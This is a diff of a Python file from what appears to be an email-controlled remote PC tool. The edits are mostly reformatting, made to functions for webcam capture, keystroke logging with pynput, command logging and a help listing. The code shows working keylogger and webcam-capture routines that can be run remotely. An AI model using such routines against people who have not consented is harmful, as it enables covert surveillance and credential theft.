@@ -48,13 +48,13 @@ def capture_webcam(cmd_list):
 
     cap = VideoCapture(0)
 
-    message: str = "A picture taken from your webcam at " + current_time() + "."
+    message: str = ""
     file_name = "Files\\Pictures\\" + file_name
     with open(file_name, "w") as f:
         pass
 
     if not cap.isOpened():
-        message = "ERROR: Cannot open camera"
+        message = "ERROR: Cannot open camera for webcam\n"
         exit()
 
     success, frame = cap.read()
@@ -62,7 +62,7 @@ def capture_webcam(cmd_list):
     imwrite(file_name, frame)
     cap.release()
     if not success:
-        message = "ERROR: Cannot capture frame"
+        message = "ERROR: Cannot capture webcam\n"
 
     return file_name, message
 
@@ -74,7 +74,7 @@ def key_logger(cmd_list):
     # ? Ensure the existence of the file
     with open(file_path, "w") as f:
         pass
-    
+
     key = logging.getLogger()
     key.setLevel(logging.INFO)
     formater = logging.Formatter("%(asctime)s - %(message)s", "%d-%b-%Y %H:%M:%S")
@@ -91,10 +91,10 @@ def key_logger(cmd_list):
     with Listener(on_press=on_press) as listener:
         sleep(duration)
         listener.stop()
-        
+
     key.removeHandler(file_handler)
     file_handler.close()
-    return file_path, duration
+    return file_path
 
 
 def note2log(sender, cmd_list, attachment, body):
@@ -104,23 +104,25 @@ def note2log(sender, cmd_list, attachment, body):
 
     with open(file_path, "a") as log:
         pass
-    
+
     key = logging.getLogger()
     key.setLevel(logging.INFO)
-    formater = logging.Formatter("Time:\t\t%(asctime)s \n%(message)s", "%d %b %Y %H:%M:%S")
+    formater = logging.Formatter(
+        "Time:\t\t%(asctime)s \n%(message)s", "%d %b %Y %H:%M:%S"
+    )
     file_handler = logging.FileHandler(file_path, mode="a")
     file_handler.setFormatter(formater)
     key.addHandler(file_handler)
-    
+
     command = [" ".join(cmd_list[i]) for i in range(len(cmd_list))]
     command = "\n\t\t\t".join(command)
-    
+
     attachment = ", ".join(attachment)
     # command = " ".join(cmd_list)
     line = f"From:\t\t{sender}\nContent:\n\t\t\t{command}\n\n"
     line += f"Reply:\t\t{body}\nAttachment:\t{attachment}\n"
     line += "----------------------------------------\n"
-    
+
     logging.info(line)
 
     key.removeHandler(file_handler)
@@ -130,7 +132,7 @@ def note2log(sender, cmd_list, attachment, body):
 def writeHelp(file_path):
     if os.path.exists(file_path):
         return
-    
+
     content = "The supported commands:"
     content += "\n\t- screenshot [file_name]"
     content += "\n\t- webcam [file_name]"
@@ -141,10 +143,11 @@ def writeHelp(file_path):
     content += "\n\t- listProcess"
     content += "\n\t- terminateProcess [PID/Process Name]"
     content += "\n\t- log"
-    content += "\n\t- help" 
+    content += "\n\t- help"
     with open(file_path, "w") as f:
         f.write(content)
     return
+
 
 def list_running_application():
     file_path = "Files\\Applications.txt"
